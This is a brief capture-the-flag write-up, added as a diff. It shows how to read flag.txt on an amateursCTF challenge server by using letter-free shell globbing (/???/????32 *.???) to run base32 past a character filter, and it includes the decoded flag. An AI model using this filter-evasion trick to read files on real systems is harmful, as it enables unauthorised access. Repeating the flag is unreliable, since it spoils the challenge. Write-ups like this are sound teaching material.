@@ -1,0 +1,18 @@
+Basically SansAlpha (from picoCTF 2024) but with actual source code and a little less guessing where files are.
+
+Trying to simply run '*' will show that the flag.txt file is in the current dir and is the first match.
+Just to be sure, we'll run *.??? because there are a bunch of files here probably, so that's best.
+It should (possibly) reduce the number of matches for the wildcard expression to be just 1 - the flag.txt file.
+
+we're gonna run /bin/base32 on the file like so:
+
+┌──(kali㉿kali)-[~]
+└─$ nc chal.amt.rs 2100
+$ /???/????32 *.???
+MFWWC5DFOVZHGQ2UIZ5XA2LDGBPXONBVNY3V6ZZQGBSF63RQOVTWQXZVGBPWSXZXGAYGWX3TN5WT
+GX3DOIZTI5BROYZV63BRMIZXE5BRGM2V6YLEMU4DQMRQMV6Q====
+
+┌──(kali㉿kali)-[~]
+└─$ echo "MFWWC5DFOVZHGQ2UIZ5XA2LDGBPXONBVNY3V6ZZQGBSF63RQOVTWQXZVGBPWSXZXGAYGWX3TN5WT
+GX3DOIZTI5BROYZV63BRMIZXE5BRGM2V6YLEMU4DQMRQMV6Q====" | base32 -d
+amateursCTF{pic0_w45n7_g00d_n0ugh_50_i_700k_som3_cr34t1v3_l1b3rt135_ade8820e}
